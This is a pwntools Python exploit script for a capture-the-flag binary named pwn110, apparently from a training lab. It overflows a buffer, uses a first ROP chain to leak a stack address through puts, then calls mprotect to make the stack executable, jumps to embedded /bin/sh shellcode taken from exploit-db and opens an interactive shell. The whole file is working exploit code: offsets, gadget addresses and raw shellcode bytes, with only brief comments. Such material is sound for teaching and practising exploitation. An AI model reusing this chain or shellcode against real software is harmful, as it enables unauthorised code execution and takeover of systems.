from pwn import *

context.binary = elf = ELF("./pwn110.pwn110",checksec=False)
context.arch = "amd64"

p = process()
#p = remote('10.10.224.70',9010)

# shellcode /bin/sh from https://www.exploit-db.com/exploits/46907
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05" #
offset = 40

back_to_main = p64(elf.symbols['main'])
puts = p64(elf.symbols['puts'])
stack_end = p64(0x4bfa70)
pop_rdi = p64(0x40191a)

payload1 = b''
payload1 += b'A' * offset
payload1 += pop_rdi
payload1 += stack_end
payload1 += puts
payload1 += back_to_main

p.recvuntil(b"libc ") #receive puts message
p.recvline() #receive emote 
p.sendline(payload1) 

stack_end_address = u64(p.recvline().strip().ljust(8,b"\0")) #receive address leaked
log.info(f"End of stack address is: {hex(stack_end_address)}")

stack_aligned_address = stack_end_address &-0xfff #convert to inital page decreasing 0x1000
log.info(f"stack aligned stack address is: {hex(stack_aligned_address)}")

mprotect_addr = p64(0x449b70)
stack_addr = p64(stack_aligned_address) 
pop_rdx = p64(0x000000000040181f)
pop_rsi = p64(0x000000000040f4de)
size = p64(0x1000)
jmp_rsp = p64(0x413ef5)
ret = p64(0x40101a)
mode = p64(0x07) 

# int mprotect(void *addr, size_t len, int prot);   <- rdi = stack_addr     rsi = 0x21000   rdx = 0x7 

payload2 = b'A' * offset # reach return
payload2 += ret #ret instruction to bypass movaps
payload2 += pop_rdi 
payload2 += stack_addr # *addr
payload2 += pop_rsi
payload2 += size # size_t
payload2 += pop_rdx
payload2 += mode # Read Write and Execute mode 
payload2 += mprotect_addr # function
payload2 += jmp_rsp # rsp = shellcode location
payload2 += shellcode	

#open("payload","wb").write(payload2)

p.recvuntil(b"libc ")
p.recvline()
p.sendline(payload2)
p.interactive()



	
